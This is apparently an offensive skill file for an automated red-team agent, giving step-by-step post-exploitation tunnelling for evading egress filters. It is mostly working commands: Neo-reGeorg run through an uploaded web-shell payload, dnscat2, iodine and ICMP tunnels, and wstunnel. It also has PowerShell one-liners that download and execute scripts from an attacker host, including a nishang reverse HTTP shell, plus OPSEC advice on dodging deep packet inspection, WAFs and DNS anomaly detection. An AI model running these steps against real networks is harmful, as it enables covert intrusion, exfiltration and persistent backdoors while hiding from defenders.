---
name: pivoting-http
description: HTTP tunnel for restricted egress environments with protocol encapsulation
version: 1.0.0
phase: post
category: lateral_movement
tags: [pivoting, http, tunnel, egress]
tools: [nishang, reGeorg, curl]
difficulty: advanced
opsec_level: silent
time_estimate: 120s
severity_if_found: critical
related_skills:
  - pivoting-ssh
  - pivoting-socks
  - tunneling-pivoting
mitre_attack:
  - T1572
  - T1090.003
  - T1048
  - T1572.001
---

## When to Use

Use this skill when the target environment has strict egress filtering that
blocks SSH and raw TCP — but allows HTTP/HTTPS outbound. HTTP tunnels encapsulate
traffic in web protocol streams, making them appear as normal web browsing.
Useful in corporate proxy-only environments with deep packet inspection (DPI)
that would flag non-HTTP protocols.

## Prerequisites

- Web server access (upload ASPX/PHP/JSP payload) or a compromised host with outbound HTTP
- `reGeorg` or `Neo-reGeorg` client on your attack machine
- `nishang` (PowerShell) for Windows HTTP tunnelling
- `dnscat2` or `iodine` if DNS is the only allowed protocol
- Python 3 environment on the web server (or upload the server-side payload)
- Outbound HTTP (80) or HTTPS (443) — verify with `curl -I https://ATTACK_IP`

## Procedure

```bash
# ═══════════════════════════════════════════════════════════
# 1. NEO-REGEORG — HTTP tunnel via web script payload
# ═══════════════════════════════════════════════════════════
# Upload tunnel server-side payload (tunnel.php, tunnel.aspx, tunnel.jsp)
# to the compromised web server.

# On your attack machine, run the client:
python3 neoreg.py -k YOUR_PASSWORD -u http://TARGET/tunnel.php

# Neo-reGeorg exposes a SOCKS5 proxy on 127.0.0.1:1080
# Route traffic through it:
proxychains4 curl http://10.0.0.10:80
proxychains4 nmap -sT -Pn -p 22,80,443 10.0.0.0/24 --open

# With HTTPS and custom headers (evade WAF detection)
python3 neoreg.py -k YOUR_PASSWORD \
    -u https://TARGET/tunnel.php \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -H "X-Forwarded-For: 10.0.0.1" \
    --cookie "PHPSESSID=abc123"

# With proxy support (route through corporate forward proxy)
python3 neoreg.py -k YOUR_PASSWORD \
    -u http://TARGET/tunnel.php \
    --proxy http://corp-proxy:3128

# ═══════════════════════════════════════════════════════════
# 2. DNS TUNNELING — Exfiltrate/control via DNS queries
# ═══════════════════════════════════════════════════════════
# ── DNSCAT2 ──────────────────────────────────────────────
# On your attack machine (server):
ruby dnscat2.rb YOUR_DOMAIN.COM -e open -c YOUR_SECRET

# On the compromised host (client):
python3 dnscat2_client.py --dns YOUR_DOMAIN.COM --secret YOUR_SECRET

# Or via PowerShell on Windows:
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACK_IP/dnscat2.ps1'); Start-Dnscat2 -Domain YOUR_DOMAIN.COM"

# From dnscat2 session, create a TCP tunnel
# (inside the dnscat2 server console):
# session -i 1
# listen 127.0.0.1:4455 10.0.0.10:445

# ── IODINE ────────────────────────────────────────────────
# On your attack machine (server — must have root DNS access):
iodined -f -c -P YOUR_PASSWORD 10.0.0.1 YOUR_DOMAIN.COM -DD

# On the compromised host (client):
iodine -f -P YOUR_PASSWORD YOUR_DOMAIN.COM -r

# Verify: iodine creates a virtual tunnel interface (dns0)
# Tunnel IP assigned; all traffic through the DNS tunnel:
ping 10.0.0.1
ssh USER@10.0.0.1

# With base32 encoding (more reliable but slower):
iodine -f -P YOUR_PASSWORD YOUR_DOMAIN.COM -r -T base32

# ═══════════════════════════════════════════════════════════
# 3. ICMP TUNNELING — Exfiltrate via ICMP echo packets
# ═══════════════════════════════════════════════════════════
# On your attack machine (server):
# ptunnel-ng:
sudo ptunnel-ng -R TARGET_INTERNAL:3389 -p ATTACK_IP -l 13389

# On the compromised host (client):
# (Injects traffic into ICMP echo requests)
# ptunnel needs to be compiled/available

# Using Hans (ICMP tunnel):
# On server:
hans -s -m 1200 -p YOUR_PASSWORD -D 10.0.1.1
# On client:
hans -c ATTACK_IP -m 1200 -p YOUR_PASSWORD -D 10.0.1.2

# ═══════════════════════════════════════════════════════════
# 4. WEBSOCKET TUNNEL — Full-duplex over HTTP upgrade
# ═══════════════════════════════════════════════════════════
# Server-side (websocat or custom ws tunnel):
# Node.js WS tunnel server on attack machine:
npm install -g wstunnel
wstunnel server ws://0.0.0.0:8080

# On compromised host (client):
wstunnel client ws://ATTACK_IP:8080 -L 127.0.0.1:8888:10.0.0.10:80

# Verify: localhost:8888 forwards to TARGET_INTERNAL:80
curl http://127.0.0.1:8888

# WebSocket over TLS (wss://):
wstunnel server wss://0.0.0.0:443 --cert cert.pem --key key.pem
wstunnel client wss://ATTACK_IP:443 -L 8888:10.0.0.10:80

# ═══════════════════════════════════════════════════════════
# 5. SSH OVER HTTP — Encapsulate SSH in HTTP CONNECT
# ═══════════════════════════════════════════════════════════
# Method A: corkscrew (SSH through HTTP CONNECT proxy)
apt install corkscrew
cat >> ~/.ssh/config << 'SSHHTTPS'
Host behind-proxy
    HostName TARGET_SSH_HOST
    Port 22
    ProxyCommand corkscrew CORP_PROXY_IP 3128 %h %p
    User pentest
    IdentityFile ~/.ssh/pentest_key
    ServerAliveInterval 30
SSHHTTPS

ssh behind-proxy

# Method B: SSH over HTTPS with socat
# Server side (run on a HTTPS-enabled host):
socat TCP-LISTEN:443,fork TCP:localhost:22

# Client side (through HTTP CONNECT proxy):
socat - PROXY:CORP_PROXY:TARGET_SSH:443,proxyport=3128

# Method C: HTTPTunnel (GNU httptunnel)
# Server on attack machine:
hts --forward-port localhost:22 80

# Client on compromised host:
htc --forward-port 8888 ATTACK_IP:80
ssh localhost -p 8888

# ═══════════════════════════════════════════════════════════
# 6. HTTP/2 TUNNELING — Modern protocol evasion
# ═══════════════════════════════════════════════════════════
# Many DPI systems don't inspect HTTP/2 traffic deeply
# Use nghttp2 or a custom h2 tunnel:
git clone https://github.com/you/httpp2-tunnel  # hypothetical
# Build and run:
go run cmd/server/main.go -listen :443 -target :8080
go run cmd/client/main.go -connect ATTACK_IP:443 -local :8888

# HTTP/2 multiplexing: single TCP connection carries multiple streams
# No HOL blocking, better at evading connection-count-based detection

# ═══════════════════════════════════════════════════════════
# 7. NISHANG — PowerShell-based HTTP exfil tunnel (Windows)
# ═══════════════════════════════════════════════════════════
# Import nishang module on target
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACK_IP/Invoke-PoshRatHttp.ps1'); Invoke-PoshRatHttp -TargetURL http://ATTACK_IP:8080"

# On the attack machine, receive the reverse HTTP connection
# Nishang creates a pseudo-shell over HTTP GET/POST requests
```

## OPSEC Rules

- **CRITICAL**: HTTP tunnels are visible in web server logs and proxy logs — use HTTPS whenever possible
- Neo-reGeorg sends periodic keepalive HTTP requests — tune the interval to match normal web traffic patterns
- DNS tunneling is extremely noisy per-query — limit to 10-50 qps to avoid triggering DNS anomaly detection
- ICMP tunneling is banned in most production environments — only use on isolated test ranges
- WebSocket tunnels use the `Upgrade: websocket` header — signature-detectable by next-gen firewalls
- Always set `User-Agent` headers to match real browsers (Chrome/Firefox version from target timeframe)
- Remove tunnel.php/ASPX/JSP payloads after completion — they are web-accessible backdoors
- DNS tunneling requires your authoritative nameserver — never use third-party DNS for command channels
- Set TTL on DNS tunnel domain to 300 (normal) not 1 (suspicious)
- Consider HTTPS for reGeorg to encrypt tunnel content — prevent payload signature detection

## Verification

- [ ] Neo-reGeorg: `proxychains4 curl -I http://TARGET_INT_IP` routes through tunnel
- [ ] DNS tunnel: `dig @YOUR_NS test.YOUR_DOMAIN.COM` resolves from target
- [ ] ICMP tunnel: `ping 10.0.1.1` reaches server side of tunnel
- [ ] WebSocket: `curl -H "Upgrade: websocket" -H "Connection: Upgrade" http://127.0.0.1:8888` upgrades
- [ ] SSH over HTTP: `ssh behind-proxy "hostname"` returns the target hostname
- [ ] HTTP/2: `nghttp -v https://ATTACK_IP` shows HTTP/2 connection
- [ ] Nishang: Reverse shell responds from the Windows target

## Pitfalls

- **DPI detection**: Deep packet inspection can identify HTTP tunnels by entropy, timing, or payload structure — use TLS+padding
- **Connection limits**: Corporate proxies cap concurrent connections — chisel/reGeorg may stall with high-throughput tools
- **DNS caching**: Intermediate resolvers may cache tunnel DNS responses — use random subdomains with high entropy prefixes
- **ICMP restrictions**: Most cloud environments (AWS, Azure, GCP) block ICMP — verify with `ping` before relying on ICMP tunnels
- **Request size limits**: HTTP proxies may truncate requests >8KB — keep tunnel chunks small
- **Session timeouts**: Stateless HTTP tunnels may drop on idle — set keepalive or use websockets for persistent connections
- **reGeorg header overhead**: Each proxied request adds ~500b of HTTP headers — very inefficient for interactive tools
- **iodine MTU**: Default MTU may cause fragmentation — tune with `-m` and test with `ping -M do -s SIZE`
- **Java JSP payloads**: Some reGeorg payloads require Java runtime — unavailable in minimal containers
- **DNS over HTTPS (DoH)**: If the target uses DoH, traditional DNS tunneling is ineffective — fall back to TCP-based methods

## Output Format

```json
{
  "skill": "pivoting-http",
  "tunnel_type": "neoreg|dnscat2|iodine|websocket|http-connect|icmp",
  "transport_protocol": "http|https|dns|icmp|ws|h2",
  "payload_path": "/uploads/tunnel.php",
  "status": "established|degraded|blocked",
  "socks_endpoint": "127.0.0.1:1080",
  "latency_ms": 120,
  "egress_evasion": "DPI-bypass|proxy-bypass|direct",
  "throughput_kbps": "45",
  "resolved_at": "2026-07-13T12:00:00Z",
  "evidence": {
    "proxy_check": "curl -I through tunnel -> 200 OK",
    "dns_queries": 142,
    "bytes_transferred": 4096
  }
}
```
